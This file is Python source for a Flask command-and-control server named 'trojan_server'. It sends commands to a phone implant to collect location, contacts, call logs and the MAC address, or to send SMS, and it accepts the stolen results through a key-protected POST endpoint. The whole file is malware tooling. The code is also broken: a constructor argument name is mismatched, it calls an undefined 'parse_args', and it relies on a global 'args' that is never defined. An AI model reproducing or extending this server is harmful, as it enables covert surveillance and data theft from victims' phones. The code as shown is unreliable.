from flask import Flask, request, make_response, abort, Response
from OpenSSL import SSL
import sys
import time
import sys
import getopt
import argparse
import os
import signal
import json

KEY = 'LOL' + '8df639b301a1e10c36cc2f03bbdf8863'


class parse_arg:
	def __init__(self):
		self.parser = argparse.ArgumentParser(description='ACTION')
		self.parser.add_argument('--location', dest='location', action='store_true', default=False,
                   help='get Location')
		self.parser.add_argument('--contacts', dest='contacts', action='store_true', default=False,
                   help='get Contacts')
		self.parser.add_argument('--calllogs', dest='calllogs', action='store_true', default=False,
                   help='Get calllogs')
		self.parser.add_argument('--mac', dest='mac', action='store_true', default=False,
                   help='get Mac address')
		self.parser.add_argument('--sendsms', dest='sendsms', action='store', nargs='*', default=False,
                   help='Send SMS')
		self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                   help='verbose')
		self.args = self.parser.parse_args()

	def getargs(self):
		return self.args


class trojan_server():
	def __init__(self, app, host, port, args):
		self.app = app
		self.host = host
		self.port = port
		self.args = args
		self.null = 'null'
		self.excludeargs = ['verbose']
		self.nullaction = False
		self.route()

	def route(self):
		self.app.add_url_rule('/' , view_func=self.default, methods=['GET',])
		self.app.add_url_rule('/action' , view_func=self.action, methods=['GET',])
		self.app.add_url_rule('/result' , view_func=self.result, methods=['POST',])

	def start(self):
		self.app.run(host=self.host, port=self.port, debug=args.verbose)

	def default(self):
  		return 'hello'

	def action(self):

		for arg, value in sorted(vars(args).items()):
			if value != False and self.nullaction != True and arg not in self.excludeargs:
				return Response(json.dumps({arg: value}), status=200, mimetype='application/json')
		return self.null
	
	def result(self):
		if str(request.form['KEY']) == KEY:
			print(str(request.form['result']))
		else:
			print("Wrong KEY")
		#print json.dumps(str(result), indent=4)
		nullaction = True
		self.stop()
		return self.null

	def stop(self):
		func = request.environ.get('werkzeug.server.shutdown')
		if func is None:
		    raise RuntimeError('Not running with the Werkzeug Server')
		func()

if __name__ == '__main__':
	app = Flask(__name__)
	server = trojan_server(app=app, host='127.0.0.1', port=8080, arg=parse_args.getargs())
	server.start()